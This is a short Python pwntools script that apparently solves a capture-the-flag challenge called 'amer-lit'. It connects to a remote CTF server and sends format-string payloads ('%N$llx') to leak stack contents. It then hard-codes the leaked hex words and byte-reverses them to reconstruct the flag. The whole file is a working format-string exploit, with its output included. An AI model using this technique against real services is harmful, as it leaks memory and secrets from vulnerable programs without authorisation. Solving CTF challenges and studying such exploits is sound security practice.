from pwn import *

# p = process('./amer-lit')
p = remote('bin.bcactf.com', 49157)

# payload = ''.join([f"%{20+i}$llx." for i in range(5)])
# payload = ''.join([f"%{20+i}$llx." for i in range(5, 10)])
payload = ''.join([f"%{20+i}$llx." for i in range(10, 15)])

p.sendline(payload.encode())

p.interactive()


leaked = '747b667463616362.6e5f796c6c61746f.6f6c706d655f746f.6568745f676e6979.5f666f5f6573755f.5f636972656e6567.6f745f7364726f77.745f68636165725f.69757165725f6568.64726f775f646572.6e5f74696d696c5f.5f746f6e5f65706f.7ffe007d656d.a4c537ea85807d00'

from binascii import unhexlify
if leaked:
	parts = leaked.split('.')
	flag_parts = [unhex(v)[::-1] for v in parts]
	print(flag_parts)
	print(b''.join(flag_parts))
